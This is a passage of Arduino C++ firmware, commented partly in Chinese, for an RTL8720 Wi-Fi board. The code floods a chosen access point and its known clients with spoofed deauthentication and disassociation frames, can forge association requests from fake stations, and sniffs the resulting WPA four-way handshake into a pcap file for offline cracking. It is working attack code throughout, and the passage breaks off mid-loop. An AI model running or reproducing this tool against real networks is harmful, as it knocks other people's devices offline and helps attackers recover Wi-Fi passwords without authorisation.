// Define a structure for storing handshake data.
#include <Arduino.h>
#define MAX_FRAME_SIZE 512
#define MAX_HANDSHAKE_FRAMES 4
#define MAX_MANAGEMENT_FRAMES 10

// Include WiFi custom transmission functions
#include "wifi_cust_tx.h"

uint8_t deauth_bssid[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
uint16_t deauth_reason;

bool readyToSniff = false;
bool sniffer_active = false;
bool isHandshakeCaptured = false;


std::vector<uint8_t> pcapData;

// Global flag to indicate that the sniff callback has been triggered.
volatile bool sniffCallbackTriggered = false;
// During dedicated management capture, allow storing any management frames
volatile bool allowAnyMgmtFrames = false;
static bool strictCaptureMode = true; // 仅接受目标BSSID相关帧，避免无客户端时误判
// Cache of discovered client stations to target with unicast deauth
static volatile uint8_t knownClients[8][6];
static volatile uint8_t knownClientCount = 0;
// 最近一次看到客户端的时间戳（ms），用于实时检测与淘汰陈旧客户端
static volatile unsigned long knownClientLastSeenMs[8] = {0};
// 最近一次观察到 AssocResp/ReassocResp 成功的时间（ms），作为“真实入网”强佐证
static volatile unsigned long knownClientAuthAssocLastMs[8] = {0};
static volatile unsigned long knownClientAssocRespLastMs[8] = {0};

// Selected AP descriptor (shared with main sketch)
struct SelectedAP {
  String ssid;
  uint8_t bssid[6];
  int ch;
};
extern SelectedAP _selectedNetwork;
extern String AP_Channel;

static inline bool macEquals6(const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<6;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

static inline bool macEquals6v(volatile const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<6;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

static inline bool macIsUnicast(const uint8_t* mac) {
  return (mac[0] & 0x01) == 0;
}

static inline bool macIsLocallyAdmin(const uint8_t* mac) {
  return (mac[0] & 0x02) != 0;
}

// 比较两个8字节重放计数是否相等（大端）
static inline bool rcEquals(const uint8_t* a, const uint8_t* b) {
  for (int i=0;i<8;i++){ if (a[i]!=b[i]) return false; }
  return true;
}

// 判断 next 是否为 prev + 1（大端加一）
static inline bool rcIsPlusOne(const uint8_t* next, const uint8_t* prev) {
  uint8_t tmp[8]; for (int i=0;i<8;i++) tmp[i]=prev[i];
  // 大端 +1
  for (int i=7;i>=0;i--) { uint16_t v = (uint16_t)tmp[i] + 1; tmp[i] = (uint8_t)(v & 0xFF); if ((v & 0x100) == 0) break; }
  for (int i=0;i<8;i++){ if (next[i]!=tmp[i]) return false; }
  return true;
}

// Local helper: MAC -> String (declare early so it can be used below)
static inline String macToString(const uint8_t* mac, int len) {
  char buf[3*6];
  int n = 0;
  for (int i=0;i<len;i++) {
    n += snprintf(buf+n, sizeof(buf)-n, i==len-1?"%02X":"%02X:", mac[i]);
  }
  return String(buf);
}

static void addKnownClient(const uint8_t* mac) {
  if (!mac) return;
  // Ignore broadcast/multicast
  bool isBroadcast = true; for (int i=0;i<6;i++){ if (mac[i] != 0xFF) { isBroadcast=false; break; } }
  if (isBroadcast) return;
  // Ignore if equals BSSID
  if (macEquals6(mac, _selectedNetwork.bssid)) return;
  // Deduplicate
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientLastSeenMs[i] = millis(); return; }
  }
  if (knownClientCount < 8) {
    for (int i=0;i<6;i++) knownClients[knownClientCount][i] = mac[i];
    knownClientCount++;
    knownClientLastSeenMs[knownClientCount - 1] = millis();
    knownClientAuthAssocLastMs[knownClientCount - 1] = 0;
    Serial.print(F("[ClientCache] Added STA ")); Serial.println(macToString(mac,6));
  }
}

// 触达（刷新）已知客户端的最近看到时间
static inline void touchKnownClient(const uint8_t* mac) {
  if (!mac) return;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientLastSeenMs[i] = millis(); return; }
  }
}

// 记录 Auth/Assoc/Reassoc 的最近出现时间
static inline void markAuthAssocSeen(const uint8_t* mac) {
  if (!mac) return;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) { knownClientAuthAssocLastMs[i] = millis(); return; }
  }
}

// 根据MAC找到在已知客户端表中的索引，不存在则返回255
static inline uint8_t findKnownClientIndex(const uint8_t* mac) {
  if (!mac) return 255;
  for (uint8_t i=0;i<knownClientCount && i<8;i++) {
    if (macEquals6v(knownClients[i], mac)) return i;
  }
  return 255;
}

// 淘汰超过给定时长未出现的客户端，避免对离线设备发送无效帧
static void pruneStaleKnownClients(unsigned long maxAgeMs) {
  unsigned long now = millis();
  uint8_t i = 0;
  while (i < knownClientCount && i < 8) {
    unsigned long last = knownClientLastSeenMs[i];
    if (last != 0 && (now - last) > maxAgeMs) {
      // 删除第 i 个：用最后一个覆盖并减少计数
      uint8_t lastIdx = knownClientCount - 1;
      if (i != lastIdx) {
        for (int b=0;b<6;b++) knownClients[i][b] = knownClients[lastIdx][b];
        knownClientLastSeenMs[i] = knownClientLastSeenMs[lastIdx];
      }
      knownClientCount--;
    } else {
      i++;
    }
  }
}

// 全局握手包数据存储，确保数据不会丢失
std::vector<uint8_t> globalPcapData;
bool handshakeDataAvailable = false;
// WebUI元信息：最近一次成功抓包统计与时间（用于下载区显示与提示弹窗）
volatile bool handshakeJustCaptured = false;
volatile unsigned long lastCaptureTimestamp = 0;
volatile uint8_t lastCaptureHSCount = 0;
volatile uint8_t lastCaptureMgmtCount = 0;
// 调试控制（统一可控开关，默认关闭详细日志）
static bool g_verboseHandshakeLog = false;

// 提供统一的开关接口，便于外部按需启用/关闭
static inline void setVerboseHandshakeLog(bool enabled) { g_verboseHandshakeLog = enabled; }
static unsigned long g_promiscEnabledMs = 0;
// Capture mode: 0=ACTIVE(主动), 1=PASSIVE(被动), 2=EFFICIENT(高效)
#define CAPTURE_MODE_ACTIVE 0
#define CAPTURE_MODE_PASSIVE 1
#define CAPTURE_MODE_EFFICIENT 2
static int g_captureMode = CAPTURE_MODE_ACTIVE;
// Control whether capture flow actively sends deauth/disassoc during sniff (ACTIVE only)
static bool g_captureDeauthEnabled = true;

// (helper already defined above)

struct HandshakeFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
  unsigned long timestamp;  // 添加时间戳用于重复检测
  unsigned short sequence;  // 添加序列号用于重复检测
  uint8_t messageType;      // 0=unknown, 1=M1, 2=M2, 3=M3, 4=M4
};

struct HandshakeData {
  HandshakeFrame frames[MAX_HANDSHAKE_FRAMES];
  unsigned int frameCount;
};

HandshakeData capturedHandshake;

struct ManagementFrame {
  unsigned int length;
  unsigned char data[MAX_FRAME_SIZE];
};

struct ManagementData {
  ManagementFrame frames[MAX_MANAGEMENT_FRAMES];
  unsigned int frameCount;
};

// Helper function: returns the offset at which the EAPOL payload starts
// Find the offset where the LLC+EAPOL signature starts.
unsigned int findEAPOLPayloadOffset(const unsigned char *packet, unsigned int length) {
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i <= length - sig_len; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) {
        match = false;
        break;
      }
    }
    if (match) return i;
  }
  return 0; // if not found, return 0 (compare full frame)
}

// Extract the Sequence Control field (assumes 24-byte header; bytes 22-23).
unsigned short getSequenceControl(const unsigned char *packet, unsigned int length) {
  if (length < 24) return 0;
  return packet[22] | (packet[23] << 8);
}

// Parsed EAPOL information helper
struct ParsedEapolInfo {
  bool found;
  unsigned int llcOffset;      // offset of AA AA 03 ... 88 8E
  uint8_t version;             // EAPOL version
  uint8_t eapolType;           // 3 = Key
  uint16_t eapolLen;           // length field
  uint8_t descriptorType;      // 1 or 2
  uint16_t keyInfo;            // big-endian
  uint16_t keyLength;
  uint8_t replayCounter[8];
  bool hasMic;
  bool hasAck;
  bool hasInstall;
  bool hasSecure;
  bool isFromAP;               // based on source MAC == BSSID
};

// Extract DA/SA/BSSID for data frames using ToDS/FromDS
static inline bool extractAddrsForDataFrame(const unsigned char *packet, unsigned int length,
                                            const uint8_t* &da, const uint8_t* &sa, const uint8_t* &bssid) {
  if (length < 24) return false;

  // Frame Control + Duration (first 4 bytes). Base 3-address header = 24 bytes.
  uint16_t fc = packet[0] | (packet[1] << 8);
  bool toDS = (fc & (1 << 8)) != 0;
  bool fromDS = (fc & (1 << 9)) != 0;
  bool isQoS = ((fc & 0x0080) != 0); // QoS Data subtype bit

  // Fixed positions for 3-address frames
  const uint8_t* a1 = &packet[4];   // Addr1
  const uint8_t* a2 = &packet[10];  // Addr2
  const uint8_t* a3 = &packet[16];  // Addr3

  // Map addresses per IEEE 802.11
  // - ToDS=0, FromDS=0 (IBSS):      A1=DA,    A2=SA,   A3=BSSID
  // - ToDS=0, FromDS=1 (AP->STA):   A1=DA,    A2=BSSID, A3=SA
  // - ToDS=1, FromDS=0 (STA->AP):   A1=BSSID, A2=SA,   A3=DA
  // - ToDS=1, FromDS=1 (WDS): 4-address, ignore for handshake attribution
  if (!toDS && !fromDS) {
    da = a1; sa = a2; bssid = a3; return true;
  }
  if (!toDS && fromDS) {
    da = a1; sa = a3; bssid = a2; return true;
  }
  if (toDS && !fromDS) {
    da = a3; sa = a2; bssid = a1; return true;
  }
  // 4-address (WDS/mesh/backhaul). Addr4 present at offset 24 (or 30 if QoS present).
  unsigned int minLen4 = isQoS ? 32 : 30;
  if (length < minLen4) return false;
  return false; // do not use 4-address frames
}

bool parseEapol(const unsigned char *packet, unsigned int length, ParsedEapolInfo &out) {
  out = {};
  const unsigned char eapol_signature[] = {0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8E};
  const unsigned int sig_len = sizeof(eapol_signature);
  for (unsigned int i = 0; i + sig_len < length; i++) {
    bool match = true;
    for (unsigned int j = 0; j < sig_len; j++) {
      if (packet[i + j] != eapol_signature[j]) { match = false; break; }
    }
    if (!match) continue;
    // Offsets per 802.1X EAPOL Key
    unsigned int off = i + sig_len; // points at EAPOL header
    if (off + 4 > length) continue;
    uint8_t ver = packet[off + 0];
    uint8_t typ = packet[off + 1];
    uint16_t elen = ((uint16_t)packet[off + 2] << 8) | packet[off + 3];
    if (typ != 3) continue; // Only handle EAPOL-Key
    if (off + 5 > length) continue;
    uint8_t descType = packet[off + 4];
    if (off + 7 > length) continue;
    uint16_t keyInfo = ((uint16_t)packet[off + 5] << 8) | packet[off + 6];
    if (off + 9 > length) continue;
    uint16_t keyLen = ((uint16_t)packet[off + 7] << 8) | packet[off + 8];
    if (off + 17 > length) continue; // replay counter end
    uint8_t rc[8];
    for (int k = 0; k < 8; k++) rc[k] = packet[off + 9 + k];

    out.found = true;
    out.llcOffset = i;
    out.version = ver;
    out.eapolType = typ;
    out.eapolLen = elen;
    out.descriptorType = descType;
    out.keyInfo = keyInfo;
    out.keyLength = keyLen;
    memcpy(out.replayCounter, rc, 8);
    out.hasMic = (keyInfo & (1 << 8)) != 0;      // MIC bit
    out.hasAck = (keyInfo & (1 << 7)) != 0;      // ACK bit
    out.hasInstall = (keyInfo & (1 << 6)) != 0;  // Install bit
    out.hasSecure = (keyInfo & (1 << 9)) != 0;   // Secure bit

    // Direction by MAC: use 802.11 header layout (Addr2@10=SA, Addr1@4=DA)
    bool saIsBssid = false, daIsBssid = false;
    if (length >= 16) { saIsBssid = true; for (int j=0;j<6;j++){ if (packet[10+j] != _selectedNetwork.bssid[j]) { saIsBssid=false; break; } } }
    if (!saIsBssid && length >= 10) { daIsBssid = true; for (int j=0;j<6;j++){ if (packet[4+j] != _selectedNetwork.bssid[j]) { daIsBssid=false; break; } } }
    if (saIsBssid) out.isFromAP = true; else if (daIsBssid) out.isFromAP = false; else out.isFromAP = saIsBssid;
    return true;
  }
  return false;
}

// Fallback parser: when only 0x88 0x8E is found (no full LLC SNAP),
// treat EAPOL header as starting right after ethertype.
bool parseEapolFromEthertype(const unsigned char *packet, unsigned int length, ParsedEapolInfo &out) {
  out = {};
  for (unsigned int i = 0; i + 2 < length; i++) {
    if (packet[i] == 0x88 && packet[i + 1] == 0x8E) {
      unsigned int off = i + 2; // EAPOL header start
      if (off + 5 > length) continue;
      uint8_t ver = packet[off + 0];
      uint8_t typ = packet[off + 1];
      uint16_t elen = ((uint16_t)packet[off + 2] << 8) | packet[off + 3];
      if (typ != 3) continue;
      if (off + 5 > length) continue;
      uint8_t descType = packet[off + 4];
      if (off + 7 > length) continue;
      uint16_t keyInfo = ((uint16_t)packet[off + 5] << 8) | packet[off + 6];
      if (off + 17 > length) continue;
      uint16_t keyLen = ((uint16_t)packet[off + 7] << 8) | packet[off + 8];
      uint8_t rc[8]; for (int k=0;k<8;k++) rc[k] = packet[off + 9 + k];

      out.found = true;
      out.llcOffset = i; // points at ethertype
      out.version = ver;
      out.eapolType = typ;
      out.eapolLen = elen;
      out.descriptorType = descType;
      out.keyInfo = keyInfo;
      out.keyLength = keyLen;
      memcpy(out.replayCounter, rc, 8);
      out.hasMic = (keyInfo & (1 << 8)) != 0;
      out.hasAck = (keyInfo & (1 << 7)) != 0;
      out.hasInstall = (keyInfo & (1 << 6)) != 0;
      out.hasSecure = (keyInfo & (1 << 9)) != 0;
      bool saIsBssid = false, daIsBssid = false;
      if (length >= 16) { saIsBssid = true; for (int j=0;j<6;j++){ if (packet[10+j] != _selectedNetwork.bssid[j]) { saIsBssid=false; break; } } }
      if (!saIsBssid && length >= 10) { daIsBssid = true; for (int j=0;j<6;j++){ if (packet[4+j] != _selectedNetwork.bssid[j]) { daIsBssid=false; break; } } }
      if (saIsBssid) out.isFromAP = true; else if (daIsBssid) out.isFromAP = false; else out.isFromAP = saIsBssid;
      return true;
    }
  }
  return false;
}

ManagementData capturedManagement;

// --- PCAP Structures ---
struct PcapGlobalHeader {
  uint32_t magic_number;
  uint16_t version_major;
  uint16_t version_minor;
  int32_t  thiszone;
  uint32_t sigfigs;
  uint32_t snaplen;
  uint32_t network;
};

struct PcapPacketHeader {
  uint32_t ts_sec;
  uint32_t ts_usec;
  uint32_t incl_len;
  uint32_t orig_len;
};

// --- External Variables ---
// These are defined in your main file.
extern struct HandshakeData capturedHandshake;
extern struct ManagementData capturedManagement;
void rtl8720_sniff_callback(unsigned char *packet, unsigned int length, void* param);

// Pause/resume promiscuous capture around deauth transmissions
static inline void pauseCaptureForDeauth() {
  Serial.println(F("[Deauth] Pausing capture (disable promiscuous)..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(50);
}
static inline void resumeCaptureAfterDeauth(unsigned long waitMs) {
  Serial.print(F("[Deauth] Waiting ")); Serial.print(waitMs); Serial.println(F("ms before resuming capture..."));
  delay(waitMs);
  Serial.println(F("[Deauth] Resuming capture (enable promiscuous)..."));
  wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  delay(50);
}
// Forward declaration so it's available to helpers defined earlier
void get_frame_type_subtype(const unsigned char *packet, unsigned int &type, unsigned int &subtype);

// Parse Association/Reassociation Response status code (0 = success)
static inline bool parseAssocRespStatus(const unsigned char *packet, unsigned int length, uint16_t &statusOut) {
  if (!packet || length < 24 + 4) return false;
  unsigned int type, subtype; get_frame_type_subtype(packet, type, subtype);
  if (type != 0) return false; // not mgmt
  if (!(subtype == 1 || subtype == 3)) return false; // not AssocResp/ReassocResp
  // Body starts at offset 24: [Capabilities(2)] [Status(2)] [AID(2)] ...
  if (length < 24 + 4) return false;
  statusOut = (uint16_t)packet[24 + 2] | ((uint16_t)packet[24 + 3] << 8);
  return true;
}

// Minimal Radiotap header (8 bytes)
const uint8_t minimal_rtap[8] = {0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00};


std::vector<uint8_t> generatePcapBuffer() {
  pcapData.clear();

  // Build and append the global header.
  PcapGlobalHeader gh;
  gh.magic_number = 0xa1b2c3d4; // Little-endian magic number
  gh.version_major = 2;
  gh.version_minor = 4;
  gh.thiszone = 0;
  gh.sigfigs = 0;
  gh.snaplen = 65535;
  gh.network = 127; // DLT_IEEE802_11_RADIO

  uint8_t* ghPtr = (uint8_t*)&gh;
  for (size_t i = 0; i < sizeof(gh); i++) {
    pcapData.push_back(ghPtr[i]);
  }

  // Helper lambda to write one packet.
  auto writePacket = [&](const uint8_t* packetData, size_t packetLength) {
    PcapPacketHeader ph;
    unsigned long ms = millis();
    ph.ts_sec = ms / 1000;
    ph.ts_usec = (ms % 1000) * 1000;
    ph.incl_len = packetLength + sizeof(minimal_rtap);
    ph.orig_len = packetLength + sizeof(minimal_rtap);

    uint8_t* phPtr = (uint8_t*)&ph;
    for (size_t i = 0; i < sizeof(ph); i++) {
      pcapData.push_back(phPtr[i]);
    }
    // Append Radiotap header.
    for (size_t i = 0; i < sizeof(minimal_rtap); i++) {
      pcapData.push_back(minimal_rtap[i]);
    }
    // Append packet data.
    for (size_t i = 0; i < packetLength; i++) {
      pcapData.push_back(packetData[i]);
    }
  };

  // Write handshake frames.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    writePacket(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length);
  }
  // Write management frames.
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    writePacket(capturedManagement.frames[i].data, capturedManagement.frames[i].length);
  }

  return pcapData;
}

// Function to reset both handshake and management frame data.
void resetCaptureData() {
  //std::vector<uint8_t> pcapData;
  capturedHandshake.frameCount = 0;
  memset(capturedHandshake.frames, 0, sizeof(capturedHandshake.frames));
  capturedManagement.frameCount = 0;
  memset(capturedManagement.frames, 0, sizeof(capturedManagement.frames));
}

// Function to reset global handshake data
void resetGlobalHandshakeData() {
  globalPcapData.clear();
  handshakeDataAvailable = false;
  isHandshakeCaptured = false;
  handshakeJustCaptured = false;
  lastCaptureTimestamp = 0;
  lastCaptureHSCount = 0;
  lastCaptureMgmtCount = 0;
  Serial.println(F("Global handshake data reset"));
}

// 检查握手包完整性的函数声明
bool isHandshakeComplete();
bool hasBothHandshakeDirections();

void printHandshakeData() {
  Serial.println(F("---- Captured Handshake Data ----"));
  Serial.print(F("Total handshake frames captured: "));
  Serial.println(capturedHandshake.frameCount);
  Serial.print(F("Total management frames captured: "));
  Serial.println(capturedManagement.frameCount);
  
  // 显示目标网络信息
  Serial.println(F("---- Target Network Information ----"));
  Serial.print(F("SSID: "));
  Serial.println(_selectedNetwork.ssid);
  Serial.print(F("BSSID: "));
  Serial.println(macToString(_selectedNetwork.bssid, 6));
  Serial.print(F("Channel: "));
  Serial.println(_selectedNetwork.ch);
  Serial.println(F("---- End of Target Network Information ----"));
  
  // Iterate through each stored handshake frame.
  for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
    HandshakeFrame &hf = capturedHandshake.frames[i];
    Serial.print(F("Handshake Frame "));
    Serial.print(i + 1);
    Serial.print(F(" ("));
    Serial.print(hf.length);
    Serial.println(F(" bytes):"));
    
    // 显示MAC地址信息（基于DS位正确解析）
    if (hf.length >= 24) {
      uint16_t fc = hf.data[0] | (hf.data[1] << 8);
      bool toDS = (fc & (1 << 8)) != 0;
      bool fromDS = (fc & (1 << 9)) != 0;

      const uint8_t *da = nullptr, *sa = nullptr, *bssid = nullptr;
      if (!extractAddrsForDataFrame(hf.data, hf.length, da, sa, bssid)) {
        // 回退到固定偏移
        da = &hf.data[4];
        sa = &hf.data[10];
        bssid = &hf.data[16];
      }

      Serial.print(F("FC=0x")); Serial.print(fc, HEX);
      Serial.print(F(" toDS=")); Serial.print(toDS);
      Serial.print(F(" fromDS=")); Serial.println(fromDS);

      Serial.print(F("DA=")); Serial.println(macToString(da, 6));
      Serial.print(F("SA=")); Serial.println(macToString(sa, 6));
      Serial.print(F("BSSID=")); Serial.println(macToString(bssid, 6));

      bool bssidMatch = true;
      for (int j=0;j<6;j++){ if (bssid[j] != _selectedNetwork.bssid[j]) { bssidMatch=false; break; } }
      Serial.print(F("BSSID Match: ")); Serial.println(bssidMatch ? F("YES") : F("NO"));

      // 显示帧判定的消息类型（若已填充）
      if (hf.messageType >= 1 && hf.messageType <= 4) {
        Serial.print(F("Message Type: M")); Serial.println(hf.messageType);
      }

      // 显示目标BSSID用于对比
      Serial.print(F("Target BSSID: "));
      Serial.println(macToString(_selectedNetwork.bssid, 6));
    }
    
    // Print hex data in a formatted manner.
    for (unsigned int j = 0; j < hf.length; j++) {
      // Print a newline every 16 bytes with offset
      if (j % 16 == 0) {
        Serial.println();
        Serial.print(F("0x"));
        Serial.print(j, HEX);
        Serial.print(F(": "));
      }
      // Print leading zero if needed.
      if (hf.data[j] < 16) {
        Serial.print(F("0"));
      }
      Serial.print(hf.data[j], HEX);
      Serial.print(" ");
    }
    Serial.println();
    Serial.println(F("--------------------------------"));
  }
  
  // 显示管理帧信息
  for (unsigned int i = 0; i < capturedManagement.frameCount; i++) {
    ManagementFrame &mf = capturedManagement.frames[i];
    Serial.print(F("Management Frame "));
    Serial.print(i + 1);
    Serial.print(F(" ("));
    Serial.print(mf.length);
    Serial.println(F(" bytes):"));
    
    // 显示MAC地址信息
    if (mf.length >= 12) {
      Serial.print(F("Source MAC: "));
      Serial.println(macToString(&mf.data[6], 6));
      Serial.print(F("Destination MAC: "));
      Serial.println(macToString(&mf.data[0], 6));
      Serial.print(F("BSSID: "));
      Serial.println(macToString(&mf.data[10], 6));
    }
    
    Serial.println(F("--------------------------------"));
  }
  
  Serial.println(F("---- End of Handshake Data ----"));
}

void deauthAndSniff() {
  sniffer_active = true;
  // Reset capture buffers.
  resetCaptureData();

  // 停止现有的数据包侦测功能以避免冲突
  if (g_verboseHandshakeLog) Serial.println(F("Stopping existing packet detection..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(200); // 增加等待时间确保混杂模式完全关闭
  
  // 确保WiFi处于正确的状态
  WiFi.disablePowerSave(); // 关闭省电模式以确保稳定的数据包捕获

  memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
  
  // 输出目标网络信息用于调试
  if (g_verboseHandshakeLog) {
    Serial.print(F("Target network: "));
    Serial.print(_selectedNetwork.ssid);
    Serial.print(F(" ("));
    Serial.print(macToString(_selectedNetwork.bssid, 6));
    Serial.print(F(") on channel "));
    Serial.println(_selectedNetwork.ch);
  }
  
  // 检查目标网络是否有效
  if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
    Serial.println(F("ERROR: Invalid target network selected!"));
    sniffer_active = false;
    readyToSniff = false;
    return;
  }
  
  // Set the channel to the target AP's channel.
  if (g_verboseHandshakeLog) { Serial.print(F("Setting channel to: ")); Serial.println(_selectedNetwork.ch); }
  int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
  if (g_verboseHandshakeLog) { Serial.print(F("Channel set result: ")); Serial.println(channelResult); }
  
  // 等待频道切换完成
  delay(100);

// 预先诱发：抓包前先广播大量解除认证帧，然后等待适配时长再启动抓包
  if (g_captureMode != CAPTURE_MODE_PASSIVE) {
    Serial.println(F("[PreDeauth] Burst broadcast deauth before starting capture"));
    // 组合常见原因码，分批次发送
    const uint16_t reasons[] = {7, 1};
    for (int r = 0; r < 2; r++) {
      // 每个原因码发送若干帧（适度控制总量，避免长时间阻塞）
      wifi_tx_broadcast_deauth(deauth_bssid, reasons[r], 60, 200);
    }
    // 少量解除关联帧
    wifi_tx_broadcast_disassoc(deauth_bssid, 8, 10, 300);
    // 等待AP与STA侧状态收敛：高效模式 2000ms，其它模式 3000ms
    if (g_captureMode == CAPTURE_MODE_EFFICIENT) delay(2000); else delay(3000);
  } else {
    Serial.println(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
  }

  // Overall timeout for the entire cycle.
  unsigned long overallStart = millis();
  const unsigned long overallTimeout = 60000; // 增加超时时间到60秒
  
  // Phase durations - 调整时间间隔以提高握手触发概率
  const unsigned long deauthInterval = 1500; // 缩短基础去认证阶段，减少打扰
  unsigned long sniffInterval = 7000;        // 嗅探基础时间（略延长以捕捉重连）
  
  // bool cancelled = false; // not used
  
  // Enable promiscous mode BUT keep SoftAP active
  if (g_verboseHandshakeLog) Serial.println(F("Enabling promiscuous mode for handshake capture..."));
  int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
  if (g_verboseHandshakeLog) { Serial.print(F("Promiscuous mode result: ")); Serial.println(promiscResult); }
  
  // 等待混杂模式启动
  delay(200);
  g_promiscEnabledMs = millis();
  
  // 主动诱发（在严格模式下关闭，避免引入伪客户端导致误判）
  if (!strictCaptureMode) {
    uint8_t baitSta[6];
    baitSta[0] = 0x02; // locally administered, unicast
    baitSta[1] = random(256);
    baitSta[2] = random(256);
    baitSta[3] = random(256);
    baitSta[4] = random(256);
    baitSta[5] = random(256);
    addKnownClient(baitSta);
    Serial.print(F("[Bait] Send auth/assoc from STA ")); Serial.println(macToString(baitSta,6));
    // 发送认证与关联请求
    wifi_tx_auth_req(baitSta, _selectedNetwork.bssid);
    delay(10);
    wifi_tx_assoc_req(baitSta, _selectedNetwork.bssid, _selectedNetwork.ssid.c_str());
  }
  
// 改进的捕获循环
  int captureAttempts = 0;
  const int maxCaptureAttempts = 10;
  
  while ((capturedHandshake.frameCount < MAX_HANDSHAKE_FRAMES ||
          capturedManagement.frameCount < 3) &&
         ((g_captureMode == CAPTURE_MODE_EFFICIENT) || (millis() - overallStart < overallTimeout)) &&
         ((g_captureMode == CAPTURE_MODE_EFFICIENT) || (captureAttempts < maxCaptureAttempts))) {
    
    // 减少频道切换频率以避免影响WebUI连接
    static unsigned long lastChannelCheck = 0;
    if (millis() - lastChannelCheck > 5000) { // 每5秒检查一次频道
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      lastChannelCheck = millis();
    }

// ----- Deauth Phase -----
    if (g_captureMode == CAPTURE_MODE_ACTIVE) {
    if (g_verboseHandshakeLog) Serial.println(F("Starting deauth phase..."));
      // Pause capture while sending deauth
      pauseCaptureForDeauth();
      unsigned long deauthPhaseStart = millis();
      int deauthPacketCount = 0;
      
      if (g_verboseHandshakeLog) { Serial.print(F("Target BSSID: ")); Serial.println(macToString(deauth_bssid, 6)); }
      
      {
        const int maxDeauthPerPhase = 1200; // 限制单轮发送量，避免过度干扰
        while ((millis() - deauthPhaseStart < deauthInterval) && (deauthPacketCount < maxDeauthPerPhase)) {      
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
        // 在去认证阶段保留更长时间窗口，避免刚学到的客户端被过早淘汰
        pruneStaleKnownClients(15000);
        
        if (knownClientCount > 0) {
          DeauthFrame frame;
          memcpy(&frame.source, deauth_bssid, 6);
          memcpy(&frame.access_point, deauth_bssid, 6);
          // 降低日志噪声，避免影响抓包
          uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
          for (uint8_t k = 0; k < localKnownCount; k++) {
            const uint8_t *sta = (const uint8_t*)knownClients[k];
            memcpy(&frame.destination, sta, 6);
            // 对已知客户端发送小型突发：多原因码组合，提高兼容性
            const uint16_t reasons[3] = {7, 1, 4};
            for (int r = 0; r < 3; r++) {
              frame.reason = reasons[r];
              for (int i = 0; i < 3; i++) { wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); deauthPacketCount++; delayMicroseconds(200); }
            }
          }
        } else {
          // 无已知客户端：使用极轻量的广播去认证/解除关联唤醒STA，便于后续学习
          // 控制发送量，避免影响抓包与AP稳定性
          const uint16_t reasonsD[2] = {7, 1};
          for (int r = 0; r < 2 && deauthPacketCount < maxDeauthPerPhase; r++) {
            wifi_tx_broadcast_deauth(deauth_bssid, reasonsD[r], 2, 500);
            deauthPacketCount += 2;
          }
          // 可选：一次轻量解除关联
          wifi_tx_broadcast_disassoc(deauth_bssid, 8 /*inactivity*/, 1, 500);
          deauthPacketCount += 1;
        }
        }
      }
      
      if (g_verboseHandshakeLog) { Serial.print(F("Sent ")); Serial.print(deauthPacketCount); Serial.println(F(" deauth packets")); }
// Resume capture quickly to avoid missing immediate M1
      resumeCaptureAfterDeauth(120);
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
    } else {
      Serial.println(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
    }

    // ----- Sniff Phase -----
      if (g_verboseHandshakeLog) Serial.println(F("Starting sniff phase..."));

    if (promiscResult != 0) {
      if (g_verboseHandshakeLog) Serial.println(F("Re-enabling promiscuous mode..."));
      wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
    }
    
    unsigned long sniffPhaseStart = millis();
    unsigned long lastBurstTs = sniffPhaseStart;
    if (g_captureMode == CAPTURE_MODE_EFFICIENT) { sniffInterval = 15000; }

    while (millis() - sniffPhaseStart < sniffInterval) {
      delay(3);
      if ((millis() - sniffPhaseStart) % 1000 == 0) {
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
// 突发解除认证帧（抓包间隙）：周期性小突发，不中断混杂模式（仅主动模式）
      if (g_captureMode == CAPTURE_MODE_ACTIVE && g_captureDeauthEnabled && (millis() - lastBurstTs >= 300)) {
        lastBurstTs = millis();
        pruneStaleKnownClients(6000);
        // Pause capture for deauth burst during sniff
        pauseCaptureForDeauth();
        // 优先定向：已知客户端时，每个STA发少量解除认证帧
        if (knownClientCount > 0) {
          DeauthFrame frame;
          memcpy(&frame.source, deauth_bssid, 6);
          memcpy(&frame.access_point, deauth_bssid, 6);
          uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
          for (uint8_t k = 0; k < localKnownCount; k++) {
            const uint8_t *sta = (const uint8_t*)knownClients[k];
            memcpy(&frame.destination, sta, 6);
            // 多个常见原因码，小突发
